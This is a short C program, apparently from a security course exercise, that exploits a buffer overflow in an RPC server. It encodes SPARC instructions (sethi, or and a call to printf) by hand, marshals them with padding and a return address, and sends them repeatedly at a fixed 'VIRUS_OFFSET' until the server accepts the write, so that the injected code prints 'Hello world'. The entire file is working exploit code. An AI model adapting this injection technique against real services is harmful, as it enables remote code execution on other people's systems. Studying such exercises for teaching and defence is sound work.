#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "rpc.h"
int o0      = 0x8;
int o1      = 0x9;
int padding = 0x0;
int sethi   = (0x010 << 20);  //00rd100imm22
int straddrH= (0x2428c >> 10);
int straddrL= (0x2428c & 0x3ff);
int or      = (0x80102 << 12); //10rd000010rs1imm13
int printfaddr = 0x23fc4;
int pfcalladdr = 0x24280;
int codeaddr= 0x2427c; //where to jump to
int nop     = 0x0;
char attackmessage[] = "Hello world";
#define VIRUS_OFFSET  136 /*1084+4 congruent to 8(size of an entry_pt)*/

int main(int	ac,
	 char	**av)
{
	struct srss_state	state;
	int sethiinst = sethi | (o1 << 25) | straddrH;
	int orinst  = or | (o1 << 25) | (o0 << 15) | straddrL;
	int callpf  = (((printfaddr-pfcalladdr) >> 2) & 0x3FFFFFFF) | 0x40000000;
	srss_client_init(&state,3);
	
	srss_marshall(&state,"ddddddds",padding,padding,codeaddr,sethiinst,orinst,callpf,nop,attackmessage);
		scanf("%d",&ac);
	while(srss_rpc(&state,VIRUS_OFFSET) == SRSS_BAD_WRITE);
	
	return 0;
}

